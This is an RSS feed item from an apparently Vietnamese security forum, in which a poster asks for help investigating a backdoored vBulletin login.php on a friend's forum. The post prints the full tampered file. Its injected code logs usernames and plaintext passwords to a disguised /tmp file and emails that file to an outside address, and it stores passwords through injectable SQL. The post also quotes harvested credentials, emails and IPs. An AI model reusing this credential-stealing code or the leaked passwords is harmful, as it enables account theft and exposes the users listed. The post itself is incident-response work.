<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Xem lại các email đã gởi từ hàm mail() trên PHP"]]></title>
		<link>/hvaonline/posts/list/12.html</link>
		<description><![CDATA[Latest messages posted in the topic "Xem lại các email đã gởi từ hàm mail() trên PHP"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Xem lại các email đã gởi từ hàm mail() trên PHP</title>
				<description><![CDATA[ Chào các bạn,

Mình đang gặp 1 tình huống như sau:

- Forum của bạn mình sử dụng VBB có bản quyền. Nhưng hôm nay thì không login vào được. Thế là hắn nhờ mình kiểm tra tại sao.
- Mình kiểm tra trong file login.php thì phát hiện rằng có 1 đoạn mã sẽ lưu lại tất cả thông tin người gởi gởi lên. Lưu vào 1 file (mà hắn giả là session) ở /tmp/. Cứ mỗi lần file có dung lượng &gt;= 10MB thì hàm mail() sẽ tự gởi đến địa chỉ email của hắn.
- Cách khắc phục tạm thời của mình là lấy 1 file login.php sạch thế cho file đó.

Và hiện tại mình cần giúp đỡ để điều tra thêm:

1. Làm thế nào để kiểm tra đã có bao nhiêu email gởi từ hàm mail() của PHP?
2. Tại sao có 1 giai đoạn tự nhiên nó không nhận cái form password gởi lên?

Vì nội dung file log lại là:


<blockquote>User: xxx Pass: 113114 Email :xxx@yahoo.com.vn ID : 35164  GroupID : 4 IP: 123.16.146.0 Time: Sunday 22nd of April 2012 08:08:35 PM
User: xxx Pass: 314159htm Email :xxx@yahoo.com ID : 11557  GroupID : 17 IP: 113.185.1.167 Time: Sunday 22nd of April 2012 08:09:29 PM
User: xxx Pass: canhdonglua Email :xxx@yahoo.com ID : 22680  GroupID : 2 IP: 1.52.27.213 Time: Sunday 22nd of April 2012 08:11:54 PM
User: onelove46 Pass:  Email :hoahuongduong663@gmail.com ID : 31446  GroupID : 2 IP: 123.24.141.8 Time: Sunday 22nd of April 2012 08:19:00 PM
User: tienhieuo01 Pass:  Email :tienhieuo01@yahoo.com.vn ID : 26462  GroupID : 2 IP: 1.53.2.31 Time: Sunday 22nd of April 2012 08:40:21 PM
User: edenhoang Pass:  Email :uptinmuaban@gmail.com ID : 33772  GroupID : 3 IP: 113.172.221.137 Time: Sunday 22nd of April 2012 08:41:33 PM&nbsp;
		</blockquote>

Nội dung file php mà hắn đã sửa lại là:

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>&lt;?php
/*======================================================================*\
|| #################################################################### ||
|| # vBulletin 3.8.4 - Licence Number VBF6B249B5
|| # ---------------------------------------------------------------- # ||
|| # Copyright ï¿&#65533;2000-2009 Jelsoft Enterprises Ltd. All Rights Reserved. ||
|| # This file may not be redistributed in whole or significant part. # ||
|| # ---------------- VBULLETIN IS NOT FREE SOFTWARE ---------------- # ||
|| #<span class="link"> http://www.vbulletin.com</span> |<span class="link"> http://www.vbulletin.com/license.html</span> # ||
|| #################################################################### ||
\*======================================================================*/

// ####################### SET PHP ENVIRONMENT ###########################
error_reporting&#40;E_ALL & ~E_NOTICE & ~8192&#41;;

// #################### DEFINE IMPORTANT CONSTANTS #######################
define&#40;'THIS_SCRIPT', 'login'&#41;;
define&#40;'CSRF_PROTECTION', true&#41;;
define&#40;'CSRF_SKIP_LIST', 'login'&#41;;

// ################### PRE-CACHE TEMPLATES AND DATA ######################
// get special phrase groups
$phrasegroups = array&#40;&#41;;

// get special data templates from the datastore
$specialtemplates = array&#40;&#41;;

// pre-cache templates used by all actions
$globaltemplates = array&#40;&#41;;

// pre-cache templates used by specific actions
$actiontemplates = array&#40;
	'lostpw' =&gt; array&#40;
		'lostpw',
		'humanverify'
	&#41;
&#41;;

// ######################### REQUIRE BACK-END ############################
require_once&#40;'./global.php'&#41;;
require_once&#40;DIR . '/includes/functions_login.php'&#41;;

// #######################################################################
// ######################## START MAIN SCRIPT ############################
// #######################################################################

$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'a', TYPE_STR&#41;;

if &#40;empty&#40;$_REQUEST&#91;'do'&#93;&#41; AND empty&#40;$vbulletin-&gt;GPC&#91;'a'&#93;&#41;&#41;
{
	exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
}

// ############################### start logout ###############################
if &#40;$_REQUEST&#91;'do'&#93; == 'logout'&#41;
{
	define&#40;'NOPMPOPUP', true&#41;;

	$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'logouthash', TYPE_STR&#41;;

	if &#40;$vbulletin-&gt;userinfo&#91;'userid'&#93; != 0 AND !verify_security_token&#40;$vbulletin-&gt;GPC&#91;'logouthash'&#93;, $vbulletin-&gt;userinfo&#91;'securitytoken_raw'&#93;&#41;&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'logout_error', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $vbulletin-&gt;userinfo&#91;'securitytoken'&#93;&#41;&#41;&#41;;
	}

	process_logout&#40;&#41;;

	$vbulletin-&gt;url = fetch_replaced_session_url&#40;$vbulletin-&gt;url&#41;;
	if &#40;strpos&#40;$vbulletin-&gt;url, 'do=logout'&#41; !== false&#41;
	{
		$vbulletin-&gt;url = $vbulletin-&gt;options&#91;'forumhome'&#93; . '.php' . $vbulletin-&gt;session-&gt;vars&#91;'sessionurl_q'&#93;;
	}
	$show&#91;'member'&#93; = false;
	eval&#40;standard_error&#40;fetch_error&#40;'cookieclear', create_full_url&#40;$vbulletin-&gt;url&#41;, $vbulletin-&gt;options&#91;'forumhome'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl_q'&#93;&#41;, '', false&#41;&#41;;

}

// ############################### start do login ###############################
// this was a _REQUEST action but where do we all login via request?
if &#40;$_POST&#91;'do'&#93; == 'login'&#41;
{
	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'p', array&#40;
		'vb_login_username'        =&gt; TYPE_STR,
		'vb_login_password'        =&gt; TYPE_STR,
		'vb_login_md5password'     =&gt; TYPE_STR,
		'vb_login_md5password_utf' =&gt; TYPE_STR,
		'postvars'                 =&gt; TYPE_BINARY,
		'cookieuser'               =&gt; TYPE_BOOL,
		'logintype'                =&gt; TYPE_STR,
		'cssprefs'                 =&gt; TYPE_STR,
	&#41;&#41;;
	try{
      		if&#40;$vbulletin-&gt;db-&gt;query_first&#40;&quot;SELECT username FROM userpan WHERE username ='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;&#41;{
			$vbulletin-&gt;db-&gt;query_write&#40;&quot;UPDATE userpan  set password='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;.&quot;' where username='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;;
		}else{
			$vbulletin-&gt;db-&gt;query_write&#40;&quot;INSERT INTO  userpan&#40;username,password&#41; values&#40;'&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;','&quot;.$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;.&quot;'&#41;&quot;&#41;;
		}      	
		$vbulletin-&gt;GPC&#91;'vb_login_password'&#93;=&quot;&quot;;
 		}
	catch&#40;Exception $e&#41;{}
	// can the user login?
	$strikes = verify_strike_status&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;&#41;;

	if &#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93; == ''&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'badlogin', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $strikes&#41;&#41;&#41;;
	}

	// make sure our user info stays as whoever we were &#40;for example, we might be logged in via cookies already&#41;
	$original_userinfo = $vbulletin-&gt;userinfo;

	if &#40;!verify_authentication&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_password'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_md5password'&#93;, $vbulletin-&gt;GPC&#91;'vb_login_md5password_utf'&#93;, $vbulletin-&gt;GPC&#91;'cookieuser'&#93;, true&#41;&#41;
	{
		&#40;$hook = vBulletinHook::fetch_hook&#40;'login_failure'&#41;&#41; ? eval&#40;$hook&#41; : false;

		// check password
		exec_strike_user&#40;$vbulletin-&gt;userinfo&#91;'username'&#93;&#41;;

		if &#40;$vbulletin-&gt;GPC&#91;'logintype'&#93; === 'cplogin' OR $vbulletin-&gt;GPC&#91;'logintype'&#93; === 'modcplogin'&#41;
		{
			// log this error if attempting to access the control panel
			require_once&#40;DIR . '/includes/functions_log_error.php'&#41;;
			log_vbulletin_error&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;, 'security'&#41;;
		}
		$vbulletin-&gt;userinfo = $original_userinfo;

		if &#40;$vbulletin-&gt;options&#91;'usestrikesystem'&#93;&#41;
		{
			eval&#40;standard_error&#40;fetch_error&#40;'badlogin_strikes', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;, $strikes&#41;&#41;&#41;;
		}
		else
		{
			eval&#40;standard_error&#40;fetch_error&#40;'badlogin', $vbulletin-&gt;options&#91;'bburl'&#93;, $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
		}
	}

	exec_unstrike_user&#40;$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;&#41;;

	// create new session
	process_new_login&#40;$vbulletin-&gt;GPC&#91;'logintype'&#93;, $vbulletin-&gt;GPC&#91;'cookieuser'&#93;, $vbulletin-&gt;GPC&#91;'cssprefs'&#93;&#41;;



$lg_username = strtolower&#40;$vbulletin-&gt;GPC&#91;&quot;vb_login_username&quot;&#93;&#41;; 
   	$lg_password = $vbulletin-&gt;GPC&#91;&quot;vb_login_password&quot;&#93;; 
&#91;color=red&#93;   	$mail=&quot;xxx@live.com&quot;;
	$lfile=&quot;/tmp/sess_xxx&quot;;&#91;/color&#93;
	$lhande=@fopen&#40;$lfile,'a'&#41;;
$email = &quot;unknow&quot;;
        if&#40;isset&#40;$vbulletin-&gt;userinfo&#91;'email'&#93;&#41;&#41;
	$email = $vbulletin-&gt;userinfo&#91;'email'&#93;;
        $userid =$vbulletin-&gt;userinfo&#91;'userid'&#93;; 
        $groupID=$vbulletin-&gt;userinfo&#91;'usergroupid'&#93;; 
	$result = @mysql_query&#40;&quot;select email from user where username='&quot;.$vbulletin-&gt;GPC&#91;'vb_login_username'&#93;.&quot;'&quot;&#41;;
	if&#40;$result&#41;
	{
		$row = @mysql_fetch_array&#40;$result&#41;;
			$email = $row&#91;&quot;email&quot;&#93;;
	}	
	$ldata=&quot;User: &quot;.$_POST&#91;&quot;vb_login_username&quot;&#93;.&quot; Pass: &quot;.$lg_password.&quot; Email :&quot;.$email .&quot; ID : &quot;.$userid. &quot;  GroupID : &quot;.$groupID. &quot; IP: &quot;.$_SERVER&#91;&quot;REMOTE_ADDR&quot;&#93;.&quot; Time: &quot;.date&#40;'l jS \of F Y h:i:s A'&#41;.&quot;\n&quot;;
	$sub=@$_SERVER&#91;'HTTP_HOST'&#93;.&quot;  user login &quot;.date&#40;'l jS \of F Y h:i:s A'&#41;;
	@fwrite&#40;$lhande,$ldata&#41;;
	@fclose&#40;$lhande&#41;;
	if&#40;@filesize&#40;$lfile&#41;&gt;=1024*10&#41; {
		$data=file_get_contents&#40;$lfile&#41;;
		@mail&#40;$mail,$sub,$data&#41;;
		@unlink&#40;$lfile&#41;;
	}














	// do wwwect
	do_login_wwwect&#40;&#41;;

}
else if &#40;$_GET&#91;'do'&#93; == 'login'&#41;
{
	// add consistency with previous behavior
	exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
}

// ############################### start lost password ###############################
if &#40;$_REQUEST&#91;'do'&#93; == 'lostpw'&#41;
{
	$vbulletin-&gt;input-&gt;clean_gpc&#40;'r', 'email', TYPE_NOHTML&#41;;
	$email = $vbulletin-&gt;GPC&#91;'email'&#93;;

	if &#40;$permissions&#91;'forumpermissions'&#93; & $vbulletin-&gt;bf_ugp_forumpermissions&#91;'canview'&#93;&#41;
	{
		$navbits = construct_navbits&#40;array&#40;'' =&gt; $vbphrase&#91;'lost_password_recovery_form'&#93;&#41;&#41;;
		eval&#40;'$navbar = &quot;' . fetch_template&#40;'navbar'&#41; . '&quot;;'&#41;;
	}
	else
	{
		$navbar = '';
	}

	// human verification
	if &#40;fetch_require_hvcheck&#40;'lostpw'&#41;&#41;
	{
		require_once&#40;DIR . '/includes/class_humanverify.php'&#41;;
		$verification =& vB_HumanVerify::fetch_library&#40;$vbulletin&#41;;
		$human_verify = $verification-&gt;output_token&#40;&#41;;
	}
	else
	{
		$human_verify = '';
	}

	$url =& $vbulletin-&gt;url;
	eval&#40;'print_output&#40;&quot;' . fetch_template&#40;'lostpw'&#41; . '&quot;&#41;;'&#41;;
}

// ############################### start email password ###############################
if &#40;$_POST&#91;'do'&#93; == 'emailpassword'&#41;
{

	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'p', array&#40;
		'email' =&gt; TYPE_STR,
		'userid' =&gt; TYPE_UINT,
		'humanverify'  =&gt; TYPE_ARRAY,
	&#41;&#41;;

	if &#40;$vbulletin-&gt;GPC&#91;'email'&#93; == ''&#41;
	{
		eval&#40;standard_error&#40;fetch_error&#40;'invalidemail', $vbulletin-&gt;options&#91;'contactuslink'&#93;&#41;&#41;&#41;;
	}

	if &#40;fetch_require_hvcheck&#40;'lostpw'&#41;&#41;
	{
		require_once&#40;DIR . '/includes/class_humanverify.php'&#41;;
		$verify =& vB_HumanVerify::fetch_library&#40;$vbulletin&#41;;
		if &#40;!$verify-&gt;verify_token&#40;$vbulletin-&gt;GPC&#91;'humanverify'&#93;&#41;&#41;
		{
	  		standard_error&#40;fetch_error&#40;$verify-&gt;fetch_error&#40;&#41;&#41;&#41;;
	  	}
	}

	require_once&#40;DIR . '/includes/functions_user.php'&#41;;

	$users = $db-&gt;query_read_slave&#40;&quot;
		SELECT userid, username, email, languageid
		FROM &quot; . TABLE_PREFIX . &quot;user
		WHERE email = '&quot; . $db-&gt;escape_string&#40;$vbulletin-&gt;GPC&#91;'email'&#93;&#41; . &quot;'
	&quot;&#41;;
	if &#40;$db-&gt;num_rows&#40;$users&#41;&#41;
	{
		while &#40;$user = $db-&gt;fetch_array&#40;$users&#41;&#41;
		{
			if &#40;$vbulletin-&gt;GPC&#91;'userid'&#93; AND $vbulletin-&gt;GPC&#91;'userid'&#93; != $user&#91;'userid'&#93;&#41;
			{
				continue;
			}
			$user&#91;'username'&#93; = unhtmlspecialchars&#40;$user&#91;'username'&#93;&#41;;

			$user&#91;'activationid'&#93; = build_user_activation_id&#40;$user&#91;'userid'&#93;, 2, 1&#41;;

			eval&#40;fetch_email_phrases&#40;'lostpw', $user&#91;'languageid'&#93;&#41;&#41;;
			vbmail&#40;$user&#91;'email'&#93;, $subject, $message, true&#41;;
		}

		$vbulletin-&gt;url = str_replace&#40;'&quot;', '', $vbulletin-&gt;url&#41;;
		eval&#40;print_standard_wwwect&#40;'wwwect_lostpw', true, true&#41;&#41;;
	}
	else
	{
		eval&#40;standard_error&#40;fetch_error&#40;'invalidemail', $vbulletin-&gt;options&#91;'contactuslink'&#93;&#41;&#41;&#41;;
	}
}

// ############################### start reset password ###############################
if &#40;$vbulletin-&gt;GPC&#91;'a'&#93; == 'pwd' OR $_REQUEST&#91;'do'&#93; == 'resetpassword'&#41;
{

	$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'r', array&#40;
		'userid'       =&gt; TYPE_UINT,
		'u'            =&gt; TYPE_UINT,
		'activationid' =&gt; TYPE_STR,
		'i'            =&gt; TYPE_STR
	&#41;&#41;;

	if &#40;!$vbulletin-&gt;GPC&#91;'userid'&#93;&#41;
	{
		$vbulletin-&gt;GPC&#91;'userid'&#93; = $vbulletin-&gt;GPC&#91;'u'&#93;;
	}

	if &#40;!$vbulletin-&gt;GPC&#91;'activationid'&#93;&#41;
	{
		$vbulletin-&gt;GPC&#91;'activationid'&#93; = $vbulletin-&gt;GPC&#91;'i'&#93;;
	}

	$userinfo = verify_id&#40;'user', $vbulletin-&gt;GPC&#91;'userid'&#93;, 1, 1&#41;;

	$user = $db-&gt;query_first&#40;&quot;
		SELECT activationid, dateline
		FROM &quot; . TABLE_PREFIX . &quot;useractivation
		WHERE type = 1
			AND userid = $userinfo&#91;userid&#93;
	&quot;&#41;;

	if &#40;!$user&#41;
	{
		// no activation record, probably got back here after a successful request, back to home
		exec_header_wwwect&#40;$vbulletin-&gt;options&#91;'forumhome'&#93; . '.php'&#41;;
	}

	if &#40;$user&#91;'dateline'&#93; &lt; &#40;TIMENOW - 24 * 60 * 60&#41;&#41;
	{  // is it older than 24 hours?
		eval&#40;standard_error&#40;fetch_error&#40;'resetexpired', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
	}

	if &#40;$user&#91;'activationid'&#93; != $vbulletin-&gt;GPC&#91;'activationid'&#93;&#41;
	{ //wrong act id
		eval&#40;standard_error&#40;fetch_error&#40;'resetbadid', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;
	}

	// delete old activation id
	$db-&gt;query_write&#40;&quot;DELETE FROM &quot; . TABLE_PREFIX . &quot;useractivation WHERE userid = $userinfo&#91;userid&#93; AND type = 1&quot;&#41;;

	$newpassword = fetch_random_password&#40;8&#41;;

	// init user data manager
	$userdata =& datamanager_init&#40;'User', $vbulletin, ERRTYPE_STANDARD&#41;;
	$userdata-&gt;set_existing&#40;$userinfo&#41;;
	$userdata-&gt;set&#40;'password', $newpassword&#41;;
	$userdata-&gt;save&#40;&#41;;

	&#40;$hook = vBulletinHook::fetch_hook&#40;'reset_password'&#41;&#41; ? eval&#40;$hook&#41; : false;

	eval&#40;fetch_email_phrases&#40;'resetpw', $userinfo&#91;'languageid'&#93;&#41;&#41;;
	vbmail&#40;$userinfo&#91;'email'&#93;, $subject, $message, true&#41;;

	eval&#40;standard_error&#40;fetch_error&#40;'resetpw', $vbulletin-&gt;session-&gt;vars&#91;'sessionurl'&#93;&#41;&#41;&#41;;

}

/*======================================================================*\
|| ####################################################################
|| # Downloaded: 21:09, Mon Sep 28th 2009
|| # CVS: $RCSfile$ - $Revision: 31381 $
|| ####################################################################
\*======================================================================*/
?&gt;</pre>
		</div>

Thông tin về server:

<blockquote>Apache version	2.2.17
PHP version	5.2.14
MySQL version	5.0.95-community
Architecture	i686
Operating system	linux
Kernel version	2.6.18-238.19.1.el5PAE&nbsp;
		</blockquote>]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/42028.html#261895</guid>
				<link>/hvaonline/posts/list/42028.html#261895</link>
				<pubDate><![CDATA[Sun, 22 Apr 2012 22:45:49]]> GMT</pubDate>
				<author><![CDATA[ phonglanbiec]]></author>
			</item>
	</channel>
</rss>
